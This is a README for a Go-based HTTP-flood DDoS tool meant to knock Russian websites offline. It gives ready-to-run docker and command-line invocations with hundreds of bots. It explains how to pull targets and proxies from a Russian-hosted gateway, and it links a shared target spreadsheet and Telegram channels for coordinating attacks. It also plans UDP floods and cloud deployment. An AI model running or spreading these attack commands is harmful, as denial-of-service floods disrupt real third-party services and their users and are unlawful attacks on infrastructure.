# anti-rusnya-ddos

```bash docker run -it --rm lovefromukraine/antiprop:latest ddatack --bots 100 <TARGET>```

# Coordination
- https://t.me/incourse911
- https://t.me/itarmyofukraine2022 (english posts are included)


### API IMPLEMENTATION: 
- https://gitlab.com/cto.endel/atack_api.git

![image](https://user-images.githubusercontent.com/25509048/156193402-1fce09b7-fbf5-46e2-9b6b-7656a8f8827d.png)

### `ddatack` REFERENCE IMPLEMENTATIONS:
- https://gitlab.com/ELWAHAB/dd-atack (php)
- https://github.com/AlexTrushkovsky/NoWarDDoS (python)

### HOW ```antirus ddatack``` WORKS
1) Звертаєтеся до `GATEWAY` (наприклад, http://rockstarbloggers.ru/hosts.json), щоб отримати список `ДЖЕРЕЛ`.
2) Зв'язуєтеся з `ДЖЕРЕЛОМ`, щоб отримати цілі та проксі для атаки (знайдете приклади відповідей від `ДЖЕРЕЛА` в каталозі `example`).
3) Починаєте надсилати запити на адресу отриману від `ДЖЕРЕЛА`, щоб показати свою любов :blue_heart: :yellow_heart:
***
1) You contact the `GATEWAY` (e.g. http://rockstarbloggers.ru/hosts.json), to get a list of `SOURCES`.
2) Contact a `SOURCE` to get the target and proxy for attack (examples of responses are in `example/` directory).
3) Start sending requsts to the target endpoint to show your love :blue_heart: :yellow_heart: 

_TODO: Checks & verifications should be in place at every step_ 

### TARGETS DB
https://docs.google.com/spreadsheets/d/1TlWTY9jxtyyb1H3AGt4QiQo17MGEUSE4LOl7vgynwxg/edit#gid=0

## ЗБІЛДИТИ ПРОГРАМУ (TO BUILD)
```bash
git clone https://github.com/meddion/anti-rusnya-ddos.git
cd anti-rusnya-ddos

# Docker
docker build -t antirus . 
docker run -it --rm antirus help 

# Або локально (Or locally)
make build # or go build -o antirus -v .
./antirus help
```
## ДОСТУПНІ КОМАНДИ (COMMANDS)
```bash
# Щоб глянути доступні команди
docker run -it --rm antirus help 
# or
./antirus help
```
```bash
# як використовувати
./antirus help ddatack 

# HTTP flood атака від: (https://t.me/incourse911)
./antirus ddatack --api 1 --bots 500 --gateway "http://rockstarbloggers.ru/hosts.json"
./antirus ddatack --api 2 --bots 100 --onlyproxy --src <SRC_URL>
./antirus ddatack --api 2 --bots 100 --file <FILE_PATH>
```

## TODO:
- TEST, TEST, AND TEST!
- Adjust connection constants

- Push docker image to docker hub

- Make a general DDoS tool (UDP), not only HTTP flood

- Add own sources & proxies -- create gateway and target api's

- Add script to launch in GCP https://docs.google.com/document/d/1ZREB8bejySMtdSWfHS8rDNiywsytLZhV05WyUsVhNMI/edit


